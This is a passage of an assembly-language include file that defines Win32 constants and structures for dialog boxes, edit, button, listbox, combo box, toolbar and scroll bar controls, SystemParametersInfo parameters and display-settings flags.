 OIC_BANG            EQU 32515
 OIC_NOTE            EQU 32516
 OIC_WINLOGO         EQU 32517
 OIC_WARNING         EQU OIC_BANG
 OIC_ERROR           EQU OIC_HAND
 OIC_INFORMATION     EQU OIC_NOTE

 ORD_LANGDRIVER    EQU 1     ; The ordinal number for the entry point of

; Standard Icon IDs

 IDI_APPLICATION     EQU 32512
 IDI_HAND            EQU 32513
 IDI_QUESTION        EQU 32514
 IDI_EXCLAMATION     EQU 32515
 IDI_ASTERISK        EQU 32516
 IDI_WINLOGO         EQU 32517
 IDI_WARNING         EQU IDI_EXCLAMATION
 IDI_ERROR           EQU IDI_HAND
 IDI_INFORMATION     EQU IDI_ASTERISK

; Dialog Box Command IDs

 IDOK                EQU 1
 IDCANCEL            EQU 2
 IDABORT             EQU 3
 IDRETRY             EQU 4
 IDIGNORE            EQU 5
 IDYES               EQU 6
 IDNO                EQU 7
 IDCLOSE             EQU 8
 IDHELP              EQU 9

; Edit Control Styles

 ES_LEFT             EQU 0000h
 ES_CENTER           EQU 0001h
 ES_RIGHT            EQU 0002h
 ES_MULTILINE        EQU 0004h
 ES_UPPERCASE        EQU 0008h
 ES_LOWERCASE        EQU 0010h
 ES_PASSWORD         EQU 0020h
 ES_AUTOVSCROLL      EQU 0040h
 ES_AUTOHSCROLL      EQU 0080h
 ES_NOHIDESEL        EQU 0100h
 ES_OEMCONVERT       EQU 0400h
 ES_READONLY         EQU 0800h
 ES_WANTRETURN       EQU 1000h
 ES_NUMBER           EQU 2000h

; Edit Control Notification Codes

 EN_SETFOCUS         EQU 0100h
 EN_KILLFOCUS        EQU 0200h
 EN_CHANGE           EQU 0300h
 EN_UPDATE           EQU 0400h
 EN_ERRSPACE         EQU 0500h
 EN_MAXTEXT          EQU 0501h
 EN_HSCROLL          EQU 0601h
 EN_VSCROLL          EQU 0602h
 EN_ALIGN_LTR_EC     EQU 0700h
 EN_ALIGN_RTL_EC     EQU 0701h
 EC_LEFTMARGIN       EQU 0001h
 EC_RIGHTMARGIN      EQU 0002h
 EC_USEFONTINFO      EQU 0ffffh

; Edit Control Messages

 EM_GETSEL               EQU 00B0h
 EM_SETSEL               EQU 00B1h
 EM_GETRECT              EQU 00B2h
 EM_SETRECT              EQU 00B3h
 EM_SETRECTNP            EQU 00B4h
 EM_SCROLL               EQU 00B5h
 EM_LINESCROLL           EQU 00B6h
 EM_SCROLLCARET          EQU 00B7h
 EM_GETMODIFY            EQU 00B8h
 EM_SETMODIFY            EQU 00B9h
 EM_GETLINECOUNT         EQU 00BAh
 EM_LINEINDEX            EQU 00BBh
 EM_SETHANDLE            EQU 00BCh
 EM_GETHANDLE            EQU 00BDh
 EM_GETTHUMB             EQU 00BEh
 EM_LINELENGTH           EQU 00C1h
 EM_REPLACESEL           EQU 00C2h
 EM_GETLINE              EQU 00C4h
 EM_LIMITTEXT            EQU 00C5h
 EM_CANUNDO              EQU 00C6h
 EM_UNDO                 EQU 00C7h
 EM_FMTLINES             EQU 00C8h
 EM_LINEFROMCHAR         EQU 00C9h
 EM_SETTABSTOPS          EQU 00CBh
 EM_SETPASSWORDCHAR      EQU 00CCh
 EM_EMPTYUNDOBUFFER      EQU 00CDh
 EM_GETFIRSTVISIBLELINE  EQU 00CEh
 EM_SETREADONLY          EQU 00CFh
 EM_SETWORDBREAKPROC     EQU 00D0h
 EM_GETWORDBREAKPROC     EQU 00D1h
 EM_GETPASSWORDCHAR      EQU 00D2h
 EM_SETMARGINS           EQU 00D3h
 EM_GETMARGINS           EQU 00D4h
 EM_SETLIMITTEXT         EQU EM_LIMITTEXT    ;win40 Name change
 EM_GETLIMITTEXT         EQU 00D5h
 EM_POSFROMCHAR          EQU 00D6h
 EM_CHARFROMPOS          EQU 00D7h

; EDITWORDBREAKPROC code values

 WB_LEFT            EQU 0
 WB_RIGHT           EQU 1
 WB_ISDELIMITER     EQU 2

; Button Control Styles

 BS_PUSHBUTTON       EQU 00000000h
 BS_DEFPUSHBUTTON    EQU 00000001h
 BS_CHECKBOX         EQU 00000002h
 BS_AUTOCHECKBOX     EQU 00000003h
 BS_RADIOBUTTON      EQU 00000004h
 BS_3STATE           EQU 00000005h
 BS_AUTO3STATE       EQU 00000006h
 BS_GROUPBOX         EQU 00000007h
 BS_USERBUTTON       EQU 00000008h
 BS_AUTORADIOBUTTON  EQU 00000009h
 BS_OWNERDRAW        EQU 0000000Bh
 BS_LEFTTEXT         EQU 00000020h
 BS_TEXT             EQU 00000000h
 BS_ICON             EQU 00000040h
 BS_BITMAP           EQU 00000080h
 BS_LEFT             EQU 00000100h
 BS_RIGHT            EQU 00000200h
 BS_CENTER           EQU 00000300h
 BS_TOP              EQU 00000400h
 BS_BOTTOM           EQU 00000800h
 BS_VCENTER          EQU 00000C00h
 BS_PUSHLIKE         EQU 00001000h
 BS_MULTILINE        EQU 00002000h
 BS_NOTIFY           EQU 00004000h
 BS_FLAT             EQU 00008000h
 BS_RIGHTBUTTON      EQU BS_LEFTTEXT

; User Button Notification Codes

 BN_CLICKED          EQU 0
 BN_PAINT            EQU 1
 BN_HILITE           EQU 2
 BN_UNHILITE         EQU 3
 BN_DISABLE          EQU 4
 BN_DOUBLECLICKED    EQU 5
 BN_PUSHED           EQU BN_HILITE
 BN_UNPUSHED         EQU BN_UNHILITE
 BN_DBLCLK           EQU BN_DOUBLECLICKED
 BN_SETFOCUS         EQU 6
 BN_KILLFOCUS        EQU 7

; Button Control Messages

 BM_GETCHECK        EQU 00F0h
 BM_SETCHECK        EQU 00F1h
 BM_GETSTATE        EQU 00F2h
 BM_SETSTATE        EQU 00F3h
 BM_SETSTYLE        EQU 00F4h
 BM_CLICK           EQU 00F5h
 BM_GETIMAGE        EQU 00F6h
 BM_SETIMAGE        EQU 00F7h
 BST_UNCHECKED      EQU 0000h
 BST_CHECKED        EQU 0001h
 BST_INDETERMINATE  EQU 0002h
 BST_PUSHED         EQU 0004h
 BST_FOCUS          EQU 0008h

; Static Control Constants

 SS_LEFT             EQU 00000000h
 SS_CENTER           EQU 00000001h
 SS_RIGHT            EQU 00000002h
 SS_ICON             EQU 00000003h
 SS_BLACKRECT        EQU 00000004h
 SS_GRAYRECT         EQU 00000005h
 SS_WHITERECT        EQU 00000006h
 SS_BLACKFRAME       EQU 00000007h
 SS_GRAYFRAME        EQU 00000008h
 SS_WHITEFRAME       EQU 00000009h
 SS_USERITEM         EQU 0000000Ah
 SS_SIMPLE           EQU 0000000Bh
 SS_LEFTNOWORDWRAP   EQU 0000000Ch
 SS_OWNERDRAW        EQU 0000000Dh
 SS_BITMAP           EQU 0000000Eh
 SS_ENHMETAFILE      EQU 0000000Fh
 SS_ETCHEDHORZ       EQU 00000010h
 SS_ETCHEDVERT       EQU 00000011h
 SS_ETCHEDFRAME      EQU 00000012h
 SS_TYPEMASK         EQU 0000001Fh
 SS_NOPREFIX         EQU 00000080h ;   Don't do "&" character translation
 SS_NOTIFY           EQU 00000100h
 SS_CENTERIMAGE      EQU 00000200h
 SS_RIGHTJUST        EQU 00000400h
 SS_REALSIZEIMAGE    EQU 00000800h
 SS_SUNKEN           EQU 00001000h
 SS_ENDELLIPSIS      EQU 00004000h
 SS_PATHELLIPSIS     EQU 00008000h
 SS_WORDELLIPSIS     EQU 0000C000h
 SS_ELLIPSISMASK     EQU 0000C000h

; Static Control Mesages

 STM_SETICON         EQU 0170h
 STM_GETICON         EQU 0171h
 STM_SETIMAGE        EQU 0172h
 STM_GETIMAGE        EQU 0173h
 STN_CLICKED         EQU 0
 STN_DBLCLK          EQU 1
 STN_ENABLE          EQU 2
 STN_DISABLE         EQU 3
 STM_MSGMAX          EQU 0174h

; DlgDirList, DlgDirListComboBox flags values

 DDL_READWRITE       EQU 0000h
 DDL_READONLY        EQU 0001h
 DDL_HIDDEN          EQU 0002h
 DDL_SYSTEM          EQU 0004h
 DDL_DIRECTORY       EQU 0010h
 DDL_ARCHIVE         EQU 0020h
 DDL_POSTMSGS        EQU 2000h
 DDL_DRIVES          EQU 4000h
 DDL_EXCLUSIVE       EQU 8000h

; Dialog Styles

 DS_ABSALIGN         EQU 01h
 DS_SYSMODAL         EQU 02h
 DS_LOCALEDIT        EQU 20h     ;Edit items get Local storage.
 DS_SETFONT          EQU 40h     ;User specified font for Dlg controls
 DS_MODALFRAME       EQU 80h     ;Can be combined with WS_CAPTION
 DS_NOIDLEMSG        EQU 100h    ;WM_ENTERIDLE message will not be sent
 DS_SETFOREGROUND    EQU 200h    ;not in win3.1
 DS_3DLOOK           EQU 0004h
 DS_FIXEDSYS         EQU 0008h
 DS_NOFAILCREATE     EQU 0010h
 DS_CONTROL          EQU 0400h
 DS_CENTER           EQU 0800h
 DS_CENTERMOUSE      EQU 1000h
 DS_CONTEXTHELP      EQU 2000h

 DM_GETDEFID         EQU WM_USER+0
 DM_SETDEFID         EQU WM_USER+1
 DM_REPOSITION       EQU WM_USER+2

 DC_HASDEFID         EQU 534Bh

; Dialog Codes

 DLGC_WANTARROWS     EQU 0001h   ;    Control wants arrow keys
 DLGC_WANTTAB        EQU 0002h   ;    Control wants tab keys
 DLGC_WANTALLKEYS    EQU 0004h   ;    Control wants all keys
 DLGC_WANTMESSAGE    EQU 0004h   ;    Pass message to control
 DLGC_HASSETSEL      EQU 0008h   ;    Understands EM_SETSEL message
 DLGC_DEFPUSHBUTTON  EQU 0010h   ;    Default pushbutton
 DLGC_UNDEFPUSHBUTTON EQU 0020h  ;    Non-default pushbutton
 DLGC_RADIOBUTTON    EQU 0040h   ;    Radio button
 DLGC_WANTCHARS      EQU 0080h   ;    Want WM_CHAR messages
 DLGC_STATIC         EQU 0100h   ;     Static item: don't include
 DLGC_BUTTON         EQU 2000h   ;    Button item: can be checked

; Listbox Return Values

 LB_OKAY             EQU 0
 LB_ERR              EQU -1
 LB_ERRSPACE         EQU -2

; Listbox Notification Codes

 LBN_ERRSPACE        EQU -2
 LBN_SELCHANGE       EQU 1
 LBN_DBLCLK          EQU 2
 LBN_SELCANCEL       EQU 3
 LBN_SETFOCUS        EQU 4
 LBN_KILLFOCUS       EQU 5

; Listbox messages

 LB_ADDSTRING            EQU 0180h
 LB_INSERTSTRING         EQU 0181h
 LB_DELETESTRING         EQU 0182h
 LB_SELITEMRANGEEX       EQU 0183h
 LB_RESETCONTENT         EQU 0184h
 LB_SETSEL               EQU 0185h
 LB_SETCURSEL            EQU 0186h
 LB_GETSEL               EQU 0187h
 LB_GETCURSEL            EQU 0188h
 LB_GETTEXT              EQU 0189h
 LB_GETTEXTLEN           EQU 018Ah
 LB_GETCOUNT             EQU 018Bh
 LB_SELECTSTRING         EQU 018Ch
 LB_DIR                  EQU 018Dh
 LB_GETTOPINDEX          EQU 018Eh
 LB_FINDSTRING           EQU 018Fh
 LB_GETSELCOUNT          EQU 0190h
 LB_GETSELITEMS          EQU 0191h
 LB_SETTABSTOPS          EQU 0192h
 LB_GETHORIZONTALEXTENT  EQU 0193h
 LB_SETHORIZONTALEXTENT  EQU 0194h
 LB_SETCOLUMNWIDTH       EQU 0195h
 LB_ADDFILE              EQU 0196h
 LB_SETTOPINDEX          EQU 0197h
 LB_GETITEMRECT          EQU 0198h
 LB_GETITEMDATA          EQU 0199h
 LB_SETITEMDATA          EQU 019Ah
 LB_SELITEMRANGE         EQU 019Bh
 LB_SETANCHORINDEX       EQU 019Ch
 LB_GETANCHORINDEX       EQU 019Dh
 LB_SETCARETINDEX        EQU 019Eh
 LB_GETCARETINDEX        EQU 019Fh
 LB_SETITEMHEIGHT        EQU 01A0h
 LB_GETITEMHEIGHT        EQU 01A1h
 LB_FINDSTRINGEXACT      EQU 01A2h
 LB_SETLOCALE            EQU 01A5h
 LB_GETLOCALE            EQU 01A6h
 LB_SETCOUNT             EQU 01A7h
 LB_INITSTORAGE          EQU 01A8h
 LB_ITEMFROMPOINT        EQU 01A9h
 LB_MULTIPLEADDSTRING    EQU 01B1h
 LB_MSGMAX               EQU 01B0h

; Listbox Styles

 LBS_NOTIFY            EQU 0001h
 LBS_SORT              EQU 0002h
 LBS_NOREDRAW          EQU 0004h
 LBS_MULTIPLESEL       EQU 0008h
 LBS_OWNERDRAWFIXED    EQU 0010h
 LBS_OWNERDRAWVARIABLE EQU 0020h
 LBS_HASSTRINGS        EQU 0040h
 LBS_USETABSTOPS       EQU 0080h
 LBS_NOINTEGRALHEIGHT  EQU 0100h
 LBS_MULTICOLUMN       EQU 0200h
 LBS_WANTKEYBOARDINPUT EQU 0400h
 LBS_EXTENDEDSEL       EQU 0800h
 LBS_DISABLENOSCROLL   EQU 1000h
 LBS_NODATA            EQU 2000h
 LBS_NOSEL             EQU 4000h
 LBS_STANDARD          EQU (LBS_NOTIFY OR LBS_SORT OR WS_VSCROLL OR WS_BORDER)

; Combo Box return Values

 CB_OKAY             EQU 0
 CB_ERR              EQU -1
 CB_ERRSPACE         EQU -2

; Combo Box Notification Codes

 CBN_ERRSPACE        EQU -1
 CBN_SELCHANGE       EQU 1
 CBN_DBLCLK          EQU 2
 CBN_SETFOCUS        EQU 3
 CBN_KILLFOCUS       EQU 4
 CBN_EDITCHANGE      EQU 5
 CBN_EDITUPDATE      EQU 6
 CBN_DROPDOWN        EQU 7
 CBN_CLOSEUP         EQU 8
 CBN_SELENDOK        EQU 9
 CBN_SELENDCANCEL    EQU 10

; Combo Box styles

 CBS_SIMPLE            EQU 0001h
 CBS_DROPDOWN          EQU 0002h
 CBS_DROPDOWNLIST      EQU 0003h
 CBS_OWNERDRAWFIXED    EQU 0010h
 CBS_OWNERDRAWVARIABLE EQU 0020h
 CBS_AUTOHSCROLL       EQU 0040h
 CBS_OEMCONVERT        EQU 0080h
 CBS_SORT              EQU 0100h
 CBS_HASSTRINGS        EQU 0200h
 CBS_NOINTEGRALHEIGHT  EQU 0400h
 CBS_DISABLENOSCROLL   EQU 0800h
 CBS_UPPERCASE         EQU 2000h
 CBS_LOWERCASE         EQU 4000h

;====== COMMON CONTROL STYLES =====

CCS_TOP            =     00000001h
CCS_NOMOVEY        =     00000002h
CCS_BOTTOM         =     00000003h
CCS_NORESIZE       =     00000004h
CCS_NOPARENTALIGN  =     00000008h
CCS_ADJUSTABLE     =     00000020h
CCS_NODIVIDER      =     00000040h


; Combo Box messages

 CB_GETEDITSEL               EQU 0140h
 CB_LIMITTEXT                EQU 0141h
 CB_SETEDITSEL               EQU 0142h
 CB_ADDSTRING                EQU 0143h
 CB_DELETESTRING             EQU 0144h
 CB_DIR                      EQU 0145h
 CB_GETCOUNT                 EQU 0146h
 CB_GETCURSEL                EQU 0147h
 CB_GETLBTEXT                EQU 0148h
 CB_GETLBTEXTLEN             EQU 0149h
 CB_INSERTSTRING             EQU 014Ah
 CB_RESETCONTENT             EQU 014Bh
 CB_FINDSTRING               EQU 014Ch
 CB_SELECTSTRING             EQU 014Dh
 CB_SETCURSEL                EQU 014Eh
 CB_SHOWDROPDOWN             EQU 014Fh
 CB_GETITEMDATA              EQU 0150h
 CB_SETITEMDATA              EQU 0151h
 CB_GETDROPPEDCONTROLRECT    EQU 0152h
 CB_SETITEMHEIGHT            EQU 0153h
 CB_GETITEMHEIGHT            EQU 0154h
 CB_SETEXTENDEDUI            EQU 0155h
 CB_GETEXTENDEDUI            EQU 0156h
 CB_GETDROPPEDSTATE          EQU 0157h
 CB_FINDSTRINGEXACT          EQU 0158h
 CB_SETLOCALE                EQU 0159h
 CB_GETLOCALE                EQU 015Ah
 CB_GETTOPINDEX              EQU 015bh
 CB_SETTOPINDEX              EQU 015ch
 CB_GETHORIZONTALEXTENT      EQU 015dh
 CB_SETHORIZONTALEXTENT      EQU 015eh
 CB_GETDROPPEDWIDTH          EQU 015fh
 CB_SETDROPPEDWIDTH          EQU 0160h
 CB_INITSTORAGE              EQU 0161h
 CB_MULTIPLEADDSTRING        EQU 0163h
 CB_MSGMAX                   EQU 0162h

 SB_SETPARTS     equ WM_USER+4
 SB_SETTEXT      equ WM_USER+1

 TBSTATE_CHECKED       =  01h
 TBSTATE_PRESSED       =  02h
 TBSTATE_ENABLED       =  04h
 TBSTATE_HIDDEN        =  08h
 TBSTATE_INDETERMINATE =  10h
 TBSTATE_WRAP          =  20h

 TBSTYLE_BUTTON        =  00h
 TBSTYLE_SEP           =  01h
 TBSTYLE_CHECK         =  02h
 TBSTYLE_GROUP         =  04h
 TBSTYLE_CHECKGROUP    =  TBSTYLE_GROUP+TBSTYLE_CHECK

 TBSTYLE_TOOLTIPS      =  0100h
 TBSTYLE_WRAPABLE      =  0200h
 TBSTYLE_ALTDRAG       =  0400h

 TB_ENABLEBUTTON       =  (WM_USER + 1)
 TB_CHECKBUTTON        =  (WM_USER + 2)
 TB_PRESSBUTTON        =  (WM_USER + 3)
 TB_HIDEBUTTON         =  (WM_USER + 4)
 TB_INDETERMINATE      =  (WM_USER + 5)
 TB_ISBUTTONENABLED    =  (WM_USER + 9)
 TB_ISBUTTONCHECKED    =  (WM_USER + 10)
 TB_ISBUTTONPRESSED    =  (WM_USER + 11)
 TB_ISBUTTONHIDDEN     =  (WM_USER + 12)
 TB_ISBUTTONINDETERMINATE = (WM_USER + 13)
 TB_SETSTATE           =  (WM_USER + 17)
 TB_GETSTATE           =  (WM_USER + 18)
 TB_ADDBITMAP          =  (WM_USER + 19)
 TB_SAVERESTOREA       =  (WM_USER + 26)
 TB_SAVERESTOREW       =  (WM_USER + 76)
 TB_CUSTOMIZE          =  (WM_USER + 27)
 TB_ADDSTRINGA         =  (WM_USER + 28)
 TB_ADDSTRINGW         =  (WM_USER + 77)
 TB_GETITEMRECT        =  (WM_USER + 29)
 TB_BUTTONSTRUCTSIZE   =  (WM_USER + 30)
 TB_SETBUTTONSIZE      =  (WM_USER + 31)
 TB_SETBITMAPSIZE      =  (WM_USER + 32)
 TB_AUTOSIZE           =  (WM_USER + 33)
 TB_GETTOOLTIPS        =  (WM_USER + 35)
 TB_SETTOOLTIPS        =  (WM_USER + 36)
 TB_SETPARENT          =  (WM_USER + 37)
 TB_SETROWS            =  (WM_USER + 39)
 TB_GETROWS            =  (WM_USER + 40)
 TB_SETCMDID           =  (WM_USER + 42)
 TB_CHANGEBITMAP       =  (WM_USER + 43)
 TB_GETBITMAP          =  (WM_USER + 44)
 TB_GETBUTTONTEXTA     =  (WM_USER + 45)
 TB_GETBUTTONTEXTW     =  (WM_USER + 75)
 TB_REPLACEBITMAP      =  (WM_USER + 46)

; Scroll Bar Styles

 SBS_HORZ                    EQU 0000h
 SBS_VERT                    EQU 0001h
 SBS_TOPALIGN                EQU 0002h
 SBS_LEFTALIGN               EQU 0002h
 SBS_BOTTOMALIGN             EQU 0004h
 SBS_RIGHTALIGN              EQU 0004h
 SBS_SIZEBOXTOPLEFTALIGN     EQU 0002h
 SBS_SIZEBOXBOTTOMRIGHTALIGN EQU 0004h
 SBS_SIZEBOX                 EQU 0008h
 SBS_SIZEGRIP                EQU 0010h

; Scroll bar messages

 SBM_SETPOS                  EQU 00E0h
 SBM_GETPOS                  EQU 00E1h
 SBM_SETRANGE                EQU 00E2h
 SBM_SETRANGEREDRAW          EQU 00E6h
 SBM_GETRANGE                EQU 00E3h
 SBM_ENABLE_ARROWS           EQU 00E4h
 SBM_SETSCROLLINFO           EQU 00E9h
 SBM_GETSCROLLINFO           EQU 00EAh

 SIF_RANGE           EQU 0001h
 SIF_PAGE            EQU 0002h
 SIF_POS             EQU 0004h
 SIF_DISABLENOSCROLL EQU 0008h
 SIF_TRACKPOS        EQU 0010h
 SIF_ALL             EQU (SIF_RANGE OR SIF_PAGE OR SIF_POS OR SIF_TRACKPOS)

; Parameter for SystemParametersInfo()

 SPI_GETBEEP                 EQU 1
 SPI_SETBEEP                 EQU 2
 SPI_GETMOUSE                EQU 3
 SPI_SETMOUSE                EQU 4
 SPI_GETBORDER               EQU 5
 SPI_SETBORDER               EQU 6
 SPI_GETKEYBOARDSPEED       EQU 10
 SPI_SETKEYBOARDSPEED       EQU 11
 SPI_LANGDRIVER             EQU 12
 SPI_ICONHORIZONTALSPACING  EQU 13
 SPI_GETSCREENSAVETIMEOUT   EQU 14
 SPI_SETSCREENSAVETIMEOUT   EQU 15
 SPI_GETSCREENSAVEACTIVE    EQU 16
 SPI_SETSCREENSAVEACTIVE    EQU 17
 SPI_GETGRIDGRANULARITY     EQU 18
 SPI_SETGRIDGRANULARITY     EQU 19
 SPI_SETDESKWALLPAPER       EQU 20
 SPI_SETDESKPATTERN         EQU 21
 SPI_GETKEYBOARDDELAY       EQU 22
 SPI_SETKEYBOARDDELAY       EQU 23
 SPI_ICONVERTICALSPACING    EQU 24
 SPI_GETICONTITLEWRAP       EQU 25
 SPI_SETICONTITLEWRAP       EQU 26
 SPI_GETMENUDROPALIGNMENT   EQU 27
 SPI_SETMENUDROPALIGNMENT   EQU 28
 SPI_SETDOUBLECLKWIDTH      EQU 29
 SPI_SETDOUBLECLKHEIGHT     EQU 30
 SPI_GETICONTITLELOGFONT    EQU 31
 SPI_SETDOUBLECLICKTIME     EQU 32
 SPI_SETMOUSEBUTTONSWAP     EQU 33
 SPI_SETICONTITLELOGFONT    EQU 34
 SPI_GETFASTTASKSWITCH      EQU 35
 SPI_SETFASTTASKSWITCH      EQU 36
 SPI_SETDRAGFULLWINDOWS     EQU 37
 SPI_GETDRAGFULLWINDOWS     EQU 38
 SPI_GETNONCLIENTMETRICS    EQU 41
 SPI_SETNONCLIENTMETRICS    EQU 42
 SPI_GETMINIMIZEDMETRICS    EQU 43
 SPI_SETMINIMIZEDMETRICS    EQU 44
 SPI_GETICONMETRICS         EQU 45
 SPI_SETICONMETRICS         EQU 46
 SPI_SETWORKAREA            EQU 47
 SPI_GETWORKAREA            EQU 48
 SPI_SETPENWINDOWS          EQU 49
 SPI_GETHIGHCONTRAST        EQU 66
 SPI_SETHIGHCONTRAST        EQU 67
 SPI_GETKEYBOARDPREF        EQU 68
 SPI_SETKEYBOARDPREF        EQU 69
 SPI_GETSCREENREADER        EQU 70
 SPI_SETSCREENREADER        EQU 71
 SPI_GETANIMATION           EQU 72
 SPI_SETANIMATION           EQU 73
 SPI_GETFONTSMOOTHING       EQU 74
 SPI_SETFONTSMOOTHING       EQU 75
 SPI_SETDRAGWIDTH           EQU 76
 SPI_SETDRAGHEIGHT          EQU 77
 SPI_SETHANDHELD            EQU 78
 SPI_GETLOWPOWERTIMEOUT     EQU 79
 SPI_GETPOWEROFFTIMEOUT     EQU 80
 SPI_SETLOWPOWERTIMEOUT     EQU 81
 SPI_SETPOWEROFFTIMEOUT     EQU 82
 SPI_GETLOWPOWERACTIVE      EQU 83
 SPI_GETPOWEROFFACTIVE      EQU 84
 SPI_SETLOWPOWERACTIVE      EQU 85
 SPI_SETPOWEROFFACTIVE      EQU 86
 SPI_SETCURSORS             EQU 87
 SPI_SETICONS               EQU 88
 SPI_GETDEFAULTINPUTLANG    EQU 89
 SPI_SETDEFAULTINPUTLANG    EQU 90
 SPI_SETLANGTOGGLE          EQU 91
 SPI_GETWINDOWSEXTENSION    EQU 92
 SPI_SETMOUSETRAILS         EQU 93
 SPI_GETMOUSETRAILS         EQU 94
 SPI_SETSCREENSAVERRUNNING  EQU 97
 SPI_SCREENSAVERRUNNING     EQU SPI_SETSCREENSAVERRUNNING
 SPI_GETFILTERKEYS          EQU 50
 SPI_SETFILTERKEYS          EQU 51
 SPI_GETTOGGLEKEYS          EQU 52
 SPI_SETTOGGLEKEYS          EQU 53
 SPI_GETMOUSEKEYS           EQU 54
 SPI_SETMOUSEKEYS           EQU 55
 SPI_GETSHOWSOUNDS          EQU 56
 SPI_SETSHOWSOUNDS          EQU 57
 SPI_GETSTICKYKEYS          EQU 58
 SPI_SETSTICKYKEYS          EQU 59
 SPI_GETACCESSTIMEOUT       EQU 60
 SPI_SETACCESSTIMEOUT       EQU 61
 SPI_GETSERIALKEYS          EQU 62
 SPI_SETSERIALKEYS          EQU 63
 SPI_GETSOUNDSENTRY         EQU 64
 SPI_SETSOUNDSENTRY         EQU 65
 SPI_GETSNAPTODEFBUTTON     EQU 95
 SPI_SETSNAPTODEFBUTTON     EQU 96
 SPI_GETMOUSEHOVERWIDTH     EQU 98
 SPI_SETMOUSEHOVERWIDTH     EQU 99
 SPI_GETMOUSEHOVERHEIGHT   EQU 100
 SPI_SETMOUSEHOVERHEIGHT   EQU 101
 SPI_GETMOUSEHOVERTIME     EQU 102
 SPI_SETMOUSEHOVERTIME     EQU 103
 SPI_GETWHEELSCROLLLINES   EQU 104
 SPI_SETWHEELSCROLLLINES   EQU 105
 SPI_GETMENUSHOWDELAY      EQU 106
 SPI_SETMENUSHOWDELAY      EQU 107
 SPI_GETSHOWIMEUI          EQU 110
 SPI_SETSHOWIMEUI          EQU 111
 SPI_GETMOUSESPEED         EQU 112
 SPI_SETMOUSESPEED         EQU 113
 SPI_GETSCREENSAVERRUNNING EQU 114
 SPI_GETACTIVEWINDOWTRACKING         EQU 1000h
 SPI_SETACTIVEWINDOWTRACKING         EQU 1001h
 SPI_GETMENUANIMATION                EQU 1002h
 SPI_SETMENUANIMATION                EQU 1003h
 SPI_GETCOMBOBOXANIMATION            EQU 1004h
 SPI_SETCOMBOBOXANIMATION            EQU 1005h
 SPI_GETLISTBOXSMOOTHSCROLLING       EQU 1006h
 SPI_SETLISTBOXSMOOTHSCROLLING       EQU 1007h
 SPI_GETGRADIENTCAPTIONS             EQU 1008h
 SPI_SETGRADIENTCAPTIONS             EQU 1009h
 SPI_GETKEYBOARDCUES                 EQU 100Ah
 SPI_SETKEYBOARDCUES                 EQU 100Bh
 SPI_GETMENUUNDERLINES               EQU SPI_GETKEYBOARDCUES
 SPI_SETMENUUNDERLINES               EQU SPI_SETKEYBOARDCUES
 SPI_GETACTIVEWNDTRKZORDER           EQU 100Ch
 SPI_SETACTIVEWNDTRKZORDER           EQU 100Dh
 SPI_GETHOTTRACKING                  EQU 100Eh
 SPI_SETHOTTRACKING                  EQU 100Fh
 SPI_GETMENUFADE                     EQU 1012h
 SPI_SETMENUFADE                     EQU 1013h
 SPI_GETSELECTIONFADE                EQU 1014h
 SPI_SETSELECTIONFADE                EQU 1015h
 SPI_GETTOOLTIPANIMATION             EQU 1016h
 SPI_SETTOOLTIPANIMATION             EQU 1017h
 SPI_GETTOOLTIPFADE                  EQU 1018h
 SPI_SETTOOLTIPFADE                  EQU 1019h
 SPI_GETCURSORSHADOW                 EQU 101Ah
 SPI_SETCURSORSHADOW                 EQU 101Bh
 SPI_GETUIEFFECTS                    EQU 103Eh
 SPI_SETUIEFFECTS                    EQU 103Fh
 SPI_GETFOREGROUNDLOCKTIMEOUT        EQU 2000h
 SPI_SETFOREGROUNDLOCKTIMEOUT        EQU 2001h
 SPI_GETACTIVEWNDTRKTIMEOUT          EQU 2002h
 SPI_SETACTIVEWNDTRKTIMEOUT          EQU 2003h
 SPI_GETFOREGROUNDFLASHCOUNT         EQU 2004h
 SPI_SETFOREGROUNDFLASHCOUNT         EQU 2005h
 SPI_GETCARETWIDTH                   EQU 2006h
 SPI_SETCARETWIDTH                   EQU 2007h

 ARW_BOTTOMLEFT              EQU 0000h
 ARW_BOTTOMRIGHT             EQU 0001h
 ARW_TOPLEFT                 EQU 0002h
 ARW_TOPRIGHT                EQU 0003h
 ARW_STARTMASK               EQU 0003h
 ARW_STARTRIGHT              EQU 0001h
 ARW_STARTTOP                EQU 0002h
 ARW_LEFT                    EQU 0000h
 ARW_RIGHT                   EQU 0000h
 ARW_UP                      EQU 0004h
 ARW_DOWN                    EQU 0004h
 ARW_HIDE                    EQU 0008h

; flags for SERIALKEYS dwFlags field

 SERKF_SERIALKEYSON  EQU 00000001h
 SERKF_AVAILABLE     EQU 00000002h
 SERKF_INDICATOR     EQU 00000004h

;       NMHDR

NMHDR struc
    hwndFrom UINT ?
    idFrom UINT ?
    code UINT ?
NMHDR ends

;       TOOLTIPTEXT

TOOLTIPTEXT struc
    hdr NMHDR <?>
    lpszText ULONG ?
    szText db 80 dup(?)
    hinst ULONG ?
    uFlags UINT ?
TOOLTIPTEXT ends

TTN_NEEDTEXT equ 0FFFFFDF8h

; flags for HIGHCONTRAST dwFlags field

 HCF_HIGHCONTRASTON  EQU 00000001h
 HCF_AVAILABLE       EQU 00000002h
 HCF_HOTKEYACTIVE    EQU 00000004h
 HCF_CONFIRMHOTKEY   EQU 00000008h
 HCF_HOTKEYSOUND     EQU 00000010h
 HCF_INDICATOR       EQU 00000020h
 HCF_HOTKEYAVAILABLE EQU 00000040h

; Flags for ChangeDisplaySettings

 CDS_UPDATEREGISTRY  EQU 00000001h
 CDS_TEST            EQU 00000002h
 CDS_FULLSCREEN      EQU 00000004h
 CDS_GLOBAL          EQU 00000008h
 CDS_SET_PRIMARY     EQU 00000010h
 CDS_RESET           EQU 40000000h
 CDS_NORESET         EQU 10000000h

; Return values for ChangeDisplaySettings

 DISP_CHANGE_SUCCESSFUL       EQU 0
 DISP_CHANGE_RESTART          EQU 1
 DISP_CHANGE_FAILED          EQU -1
 DISP_CHANGE_BADMODE         EQU -2
 DISP_CHANGE_NOTUPDATED      EQU -3
 DISP_CHANGE_BADFLAGS        EQU -4
 DISP_CHANGE_BADPARAM        EQU -5

; dwFlags for SetWinEventHook

 WINEVENT_OUTOFCONTEXT   EQU 0000h  ; Events are ASYNC
 WINEVENT_SKIPOWNTHREAD  EQU 0001h  ; Don't call back for events on installer's thread
 WINEVENT_SKIPOWNPROCESS EQU 0002h  ; Don't call back for events on installer's process
 WINEVENT_INCONTEXT      EQU 0004h  ; Events are SYNC, this causes your dll to be injected into every process

; Reserved IDs for system objects

 OBJID_WINDOW        EQU 000000000h
 OBJID_SYSMENU       EQU 0FFFFFFFFh
 OBJID_TITLEBAR      EQU 0FFFFFFFEh
